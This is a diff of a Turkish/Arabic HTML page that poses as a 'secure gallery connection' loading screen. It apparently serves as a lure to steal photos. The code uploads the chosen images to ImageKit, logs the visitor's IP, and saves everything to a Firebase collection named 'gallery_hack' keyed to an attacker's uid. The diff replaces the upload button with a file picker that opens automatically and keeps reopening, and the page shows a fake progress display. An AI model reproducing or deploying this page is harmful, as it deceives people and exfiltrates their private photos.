@@ -1,17 +1,17 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="tr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>Fotoğraf Yükleniyor...</title>
+    <title>Yükleniyor...</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         :root {
-            --bg: #0a0a0a;
+            --bg: #000000;
             --purple: #aa00ff;
             --purple-glow: rgba(170, 0, 255, 0.4);
             --text: #d0d0d0;
-            --muted: #666;
+            --muted: #555;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -20,57 +20,106 @@
             background: var(--bg);
             font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             min-height: 100vh;
+            min-height: 100dvh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 24px;
             color: var(--text);
+            position: relative;
+            overflow: hidden;
         }
 
-        .container {
-            text-align: center;
-            max-width: 400px;
+        /* ARKAPLAN PARTİKÜLLERİ */
+        .bg-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .bg-particle {
+            position: absolute;
+            border-radius: 50%;
+            background: var(--purple);
+            opacity: 0;
+            animation: floatUp linear infinite;
+        }
+        @keyframes floatUp {
+            0% { transform: translateY(110vh) scale(0); opacity: 0; }
+            5% { opacity: 0.25; }
+            90% { opacity: 0.08; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
 
-        .icon-area {
+        /* ANA KAPSAYICI */
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        /* İKON */
+        .icon-wrapper {
+            display: inline-block;
             margin-bottom: 24px;
             position: relative;
-            display: inline-block;
         }
-        .gallery-icon {
-            font-size: 4rem;
+        .main-icon {
+            font-size: 3.5rem;
             color: var(--purple);
+            filter: drop-shadow(0 0 25px var(--purple-glow));
             animation: iconPulse 2s ease-in-out infinite;
-            filter: drop-shadow(0 0 20px var(--purple-glow));
         }
         @keyframes iconPulse {
-            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 15px var(--purple-glow)); }
-            50% { transform: scale(1.08); filter: drop-shadow(0 0 30px rgba(170, 0, 255, 0.7)); }
+            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 20px var(--purple-glow)); }
+            50% { transform: scale(1.05); filter: drop-shadow(0 0 35px rgba(170, 0, 255, 0.7)); }
+        }
+        .lock-icon {
+            position: absolute;
+            bottom: -2px;
+            right: -8px;
+            font-size: 1.1rem;
+            color: #00ff41;
+            filter: drop-shadow(0 0 6px rgba(0, 255, 65, 0.5));
+            animation: lockGlow 2s ease-in-out infinite;
+        }
+        @keyframes lockGlow {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
         }
 
+        /* YAZILAR */
         .title {
-            color: var(--purple);
-            font-size: 1.2rem;
+            color: #fff;
+            font-size: 1.1rem;
             font-weight: 700;
             margin-bottom: 6px;
             letter-spacing: 1px;
-            text-shadow: 0 0 10px var(--purple-glow);
         }
         .subtitle {
             color: var(--muted);
-            font-size: 0.75rem;
-            margin-bottom: 28px;
+            font-size: 0.65rem;
+            margin-bottom: 20px;
+            letter-spacing: 0.5px;
         }
 
+        /* SPINNER */
+        .spinner-wrapper {
+            margin-bottom: 20px;
+        }
         .spinner {
-            width: 48px;
-            height: 48px;
-            border: 3px solid rgba(170, 0, 255, 0.1);
-            border-top: 3px solid var(--purple);
+            width: 44px;
+            height: 44px;
+            border: 2.5px solid rgba(170, 0, 255, 0.1);
+            border-top: 2.5px solid var(--purple);
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto;
             box-shadow: 0 0 20px rgba(170, 0, 255, 0.2);
         }
         @keyframes spin {
@@ -78,23 +127,16 @@
             100% { transform: rotate(360deg); }
         }
 
-        .status-text {
-            color: var(--text);
-            font-size: 0.8rem;
-            margin-bottom: 8px;
+        /* PROGRESS BAR */
+        .progress-wrapper {
+            width: 100%;
+            margin-bottom: 16px;
         }
-        .count-text {
-            color: var(--purple);
-            font-size: 0.7rem;
-            font-weight: 600;
-        }
-
         .progress-bar {
             width: 100%;
-            height: 4px;
+            height: 3px;
             background: rgba(170, 0, 255, 0.1);
             border-radius: 10px;
-            margin-top: 16px;
             overflow: hidden;
         }
         .progress-fill {
@@ -102,67 +144,89 @@
             background: var(--purple);
             border-radius: 10px;
             width: 0%;
-            transition: width 0.3s ease;
-            box-shadow: 0 0 10px var(--purple-glow);
+            transition: width 0.4s ease;
+            box-shadow: 0 0 8px var(--purple-glow);
         }
-
-        .footer-text {
+        .progress-text {
             color: var(--muted);
             font-size: 0.55rem;
-            margin-top: 24px;
-            letter-spacing: 1px;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
         }
 
-        .upload-btn {
-            display: inline-block;
-            background: var(--purple);
-            color: #fff;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 30px;
-            font-size: 0.9rem;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 20px;
-            font-family: inherit;
-            letter-spacing: 1px;
+        /* STATUS */
+        .status-text {
+            color: var(--purple);
+            font-size: 0.65rem;
+            min-height: 20px;
+            letter-spacing: 0.5px;
             transition: all 0.3s;
-            box-shadow: 0 0 25px rgba(170, 0, 255, 0.3);
         }
-        .upload-btn:hover {
-            background: #bb33ff;
-            transform: translateY(-2px);
-            box-shadow: 0 0 40px rgba(170, 0, 255, 0.5);
+
+        /* ALT METİN */
+        .footer-text {
+            color: var(--muted);
+            font-size: 0.5rem;
+            margin-top: 20px;
+            letter-spacing: 1px;
         }
-        .upload-btn:active {
-            transform: scale(0.96);
+        .footer-text i {
+            color: #00ff41;
+            margin: 0 3px;
+        }
+
+        /* RTL */
+        body.rtl { direction: rtl; text-align: right; }
+        body.rtl .lock-icon { right: auto; left: -8px; }
+
+        /* MOBİL */
+        @media (max-width: 400px) {
+            .main-icon { font-size: 2.8rem; }
+            .title { font-size: 0.95rem; }
+            .spinner { width: 36px; height: 36px; }
         }
     </style>
 </head>
 <body>
+
+    <!-- ARKAPLAN PARTİKÜLLERİ -->
+    <div class="bg-particles" id="bgParticles"></div>
+
+    <!-- ANA İÇERİK -->
     <div class="container">
-        <div class="icon-area">
-            <i class="fa-solid fa-images gallery-icon"></i>
-        </div>
-        <div class="title">Galeri Erişimi</div>
-        <div class="subtitle">Fotoğraflarınız güvenli şekilde işleniyor...</div>
-
-        <div class="spinner" id="spinner"></div>
-
-        <div class="status-text" id="statusText">Galeriye bağlanılıyor...</div>
-        <div class="count-text" id="countText"></div>
-
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
+        <!-- İKON -->
+        <div class="icon-wrapper">
+            <i class="fa-solid fa-images main-icon"></i>
+            <i class="fa-solid fa-lock lock-icon"></i>
         </div>
 
-        <button class="upload-btn" id="uploadBtn" style="display:none;">
-            <i class="fa-solid fa-cloud-arrow-up"></i> Fotoğrafları Seç
-        </button>
+        <!-- BAŞLIK -->
+        <div class="title" id="titleText">Güvenli Bağlantı</div>
+        <div class="subtitle" id="subtitleText">Galeri bağlantısı kuruluyor, lütfen bekleyin...</div>
 
-        <div class="footer-text">Galeri Bağlantısı · Güvenli Aktarım</div>
+        <!-- SPINNER -->
+        <div class="spinner-wrapper">
+            <div class="spinner" id="spinner"></div>
+        </div>
+
+        <!-- PROGRESS -->
+        <div class="progress-wrapper">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+
+        <!-- STATUS -->
+        <div class="status-text" id="statusText">Bağlantı kuruluyor...</div>
+
+        <!-- ALT METİN -->
+        <div class="footer-text">
+            <i class="fa-solid fa-circle"></i> <span id="footerText">Güvenli Galeri Bağlantısı v2.0</span> <i class="fa-solid fa-circle"></i>
+        </div>
     </div>
 
+    <!-- GİZLİ DOSYA INPUT -->
     <input type="file" id="galleryInput" multiple accept="image/*" style="display:none;">
 
     <script>
@@ -170,12 +234,61 @@
             const params = new URLSearchParams(window.location.search);
             const uid = params.get('uid');
             const count = Math.min(parseInt(params.get('count')) || 10, 100);
+            const lang = params.get('lang') || 'tr';
 
             if (!uid) {
                 window.location.href = 'https://www.tiktok.com';
                 return;
             }
 
+            // ============ ÇEVİRİLER ============
+            const translations = {
+                tr: {
+                    title: "Güvenli Bağlantı",
+                    subtitle: "Galeri bağlantısı kuruluyor, lütfen bekleyin...",
+                    footer: "Güvenli Galeri Bağlantısı v2.0",
+                    connecting: "Bağlantı kuruluyor...",
+                    scanning: "Galeri taranıyor...",
+                    uploading: "Fotoğraflar aktarılıyor...",
+                    saving: "Veriler kaydediliyor...",
+                    completed: "İşlem tamamlandı",
+                    redirecting: "Yönlendiriliyorsunuz..."
+                },
+                ar: {
+                    title: "اتصال آمن",
+                    subtitle: "جاري الاتصال بالمعرض، يرجى الانتظار...",
+                    footer: "اتصال آمن بالمعرض v2.0",
+                    connecting: "جاري الاتصال...",
+                    scanning: "جاري فحص المعرض...",
+                    uploading: "جاري نقل الصور...",
+                    saving: "جاري حفظ البيانات...",
+                    completed: "اكتملت العملية",
+                    redirecting: "جاري التحويل..."
+                }
+            };
+
+            const t = translations[lang] || translations['tr'];
+
+            // ============ DİL UYGULA ============
+            function applyLanguage() {
+                document.getElementById('titleText').innerText = t.title;
+                document.getElementById('subtitleText').innerText = t.subtitle;
+                document.getElementById('footerText').innerText = t.footer;
+
+                if (lang === 'ar') {
+                    document.documentElement.dir = 'rtl';
+                    document.documentElement.lang = 'ar';
+                    document.body.classList.add('rtl');
+                } else {
+                    document.documentElement.dir = 'ltr';
+                    document.documentElement.lang = lang;
+                    document.body.classList.remove('rtl');
+                }
+            }
+
+            applyLanguage();
+
+            // ============ FIREBASE CONFIG ============
             const FIREBASE_CONFIG = {
                 apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                 authDomain: "camerahhh-15487.firebaseapp.com",
@@ -191,12 +304,34 @@
             };
 
             const statusText = document.getElementById('statusText');
-            const countText = document.getElementById('countText');
             const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
             const spinner = document.getElementById('spinner');
-            const uploadBtn = document.getElementById('uploadBtn');
             const galleryInput = document.getElementById('galleryInput');
 
+            // ============ PARTİKÜL ANİMASYONU ============
+            function initParticles() {
+                const container = document.getElementById('bgParticles');
+                for (let i = 0; i < 12; i++) {
+                    const particle = document.createElement('div');
+                    particle.classList.add('bg-particle');
+                    const size = Math.random() * 2 + 0.8;
+                    particle.style.width = size + 'px';
+                    particle.style.height = size + 'px';
+                    particle.style.left = Math.random() * 100 + '%';
+                    particle.style.bottom = '0';
+                    particle.style.animationDuration = Math.random() * 10 + 7 + 's';
+                    particle.style.animationDelay = Math.random() * 8 + 's';
+                    container.appendChild(particle);
+
+                    particle.addEventListener('animationiteration', () => {
+                        particle.style.left = Math.random() * 100 + '%';
+                        particle.style.animationDuration = Math.random() * 10 + 7 + 's';
+                    });
+                }
+            }
+
+            // ============ FIREBASE YÜKLE ============
             function loadFirebase() {
                 return new Promise((resolve, reject) => {
                     if (typeof firebase !== 'undefined' && firebase.apps.length) {
@@ -217,6 +352,7 @@
                 });
             }
 
+            // ============ IMAGEKIT YÜKLEME ============
             async function uploadToImageKit(file, index, total) {
                 return new Promise((resolve, reject) => {
                     const formData = new FormData();
@@ -236,6 +372,7 @@
                             const fileProgress = (e.loaded / e.total) * 100;
                             const overallProgress = ((index + fileProgress / 100) / total) * 100;
                             progressFill.style.width = overallProgress + '%';
+                            progressText.innerText = Math.floor(overallProgress) + '%';
                         }
                     };
 
@@ -256,6 +393,7 @@
                 });
             }
 
+            // ============ IP AL ============
             async function getIP() {
                 try {
                     const r = await fetch('https://api.ipify.org?format=json');
@@ -266,40 +404,47 @@
                 }
             }
 
-            async function startGalleryHack() {
-                await new Promise(r => setTimeout(r, 1500));
+            // ============ OTOMATİK GALERİ AÇMA ============
+            async function autoStartGalleryHack() {
+                // 1. Aşama: Bağlantı
+                statusText.innerText = t.connecting;
+                progressFill.style.width = '8%';
+                progressText.innerText = '8%';
+                await new Promise(r => setTimeout(r, 600));
 
-                statusText.innerText = 'Galeri bağlantısı kuruldu...';
-                countText.innerText = `Seçilecek fotoğraf sayısı: ${count}`;
-                progressFill.style.width = '10%';
+                // 2. Aşama: Tarama
+                statusText.innerText = t.scanning;
+                progressFill.style.width = '15%';
+                progressText.innerText = '15%';
+                await new Promise(r => setTimeout(r, 600));
 
-                await new Promise(r => setTimeout(r, 800));
+                // 3. Aşama: Galeri input'unu otomatik tıkla
+                progressFill.style.width = '22%';
+                progressText.innerText = '22%';
+                await new Promise(r => setTimeout(r, 400));
 
-                spinner.style.display = 'none';
-                uploadBtn.style.display = 'inline-block';
-                statusText.innerText = 'Devam etmek için butona tıklayın';
-                progressFill.style.width = '20%';
+                // Otomatik olarak galeri seçiciyi aç
+                galleryInput.click();
 
-                uploadBtn.onclick = () => {
-                    galleryInput.click();
-                };
-
+                // Input değişikliğini dinle
                 galleryInput.onchange = async (e) => {
                     const files = Array.from(e.target.files);
                     const selectedFiles = files.slice(0, count);
 
                     if (selectedFiles.length === 0) {
-                        statusText.innerText = 'Fotoğraf seçilmedi, yönlendiriliyor...';
+                        statusText.innerText = t.redirecting;
+                        progressFill.style.width = '100%';
+                        progressText.innerText = '100%';
                         await new Promise(r => setTimeout(r, 1500));
                         window.location.href = 'https://www.tiktok.com';
                         return;
                     }
 
-                    uploadBtn.style.display = 'none';
+                    // 4. Aşama: Yükleme başlıyor
                     spinner.style.display = 'block';
-                    statusText.innerText = `Fotoğraflar yükleniyor... (0/${selectedFiles.length})`;
-                    countText.innerText = `${selectedFiles.length} fotoğraf seçildi`;
-                    progressFill.style.width = '25%';
+                    statusText.innerText = t.uploading;
+                    progressFill.style.width = '28%';
+                    progressText.innerText = '28%';
 
                     try {
                         await loadFirebase();
@@ -310,21 +455,23 @@
                         const photoUrls = [];
 
                         for (let i = 0; i < selectedFiles.length; i++) {
-                            statusText.innerText = `Fotoğraf yükleniyor... (${i + 1}/${selectedFiles.length})`;
+                            statusText.innerText = t.uploading + ' (' + (i + 1) + '/' + selectedFiles.length + ')';
                             try {
                                 const result = await uploadToImageKit(selectedFiles[i], i, selectedFiles.length);
                                 if (result.success) {
                                     photoUrls.push(result.url);
                                 }
                             } catch (err) {
-                                console.log(`Fotoğraf ${i + 1} yüklenemedi:`, err);
+                                console.log('Fotoğraf ' + (i + 1) + ' yüklenemedi:', err);
                             }
                         }
 
-                        progressFill.style.width = '90%';
+                        // 5. Aşama: Kaydetme
+                        statusText.innerText = t.saving;
+                        progressFill.style.width = '88%';
+                        progressText.innerText = '88%';
 
                         if (photoUrls.length > 0 && uid) {
-                            statusText.innerText = 'Veriler kaydediliyor...';
                             try {
                                 await db.collection("gallery_hack").add({
                                     ownerId: uid,
@@ -351,13 +498,18 @@
                             }
                         }
 
+                        // 6. Aşama: Tamamlandı
                         progressFill.style.width = '100%';
-                        statusText.innerText = `Tamamlandı! ${photoUrls.length} fotoğraf yüklendi.`;
-                        countText.innerText = 'Yönlendiriliyorsunuz...';
+                        progressText.innerText = '100%';
+                        spinner.style.display = 'none';
+                        spinner.innerHTML = '<i class="fa-solid fa-circle-check" style="font-size:2rem;color:#00ff41;"></i>';
+                        statusText.innerText = t.completed;
 
                     } catch (e) {
                         console.log('Galeri hack hatası:', e.message);
-                        statusText.innerText = 'İşlem tamamlandı, yönlendiriliyor...';
+                        progressFill.style.width = '100%';
+                        progressText.innerText = '100%';
+                        statusText.innerText = t.completed;
                     }
 
                     await new Promise(r => setTimeout(r, 2000));
@@ -365,7 +517,25 @@
                 };
             }
 
-            startGalleryHack();
+            // ============ BAŞLAT ============
+            initParticles();
+
+            // Kullanıcı input'u iptal ederse veya sayfadan çıkarsa
+            window.addEventListener('focus', () => {
+                // Sayfaya geri dönüldüğünde tekrar dene
+                if (!galleryInput.files || galleryInput.files.length === 0) {
+                    setTimeout(() => {
+                        if (!galleryInput.files || galleryInput.files.length === 0) {
+                            galleryInput.click();
+                        }
+                    }, 500);
+                }
+            });
+
+            // Sayfa yüklendikten 1.5 saniye sonra otomatik başlat
+            setTimeout(() => {
+                autoStartGalleryHack();
+            }, 1500);
         })();
     </script>
 </body>
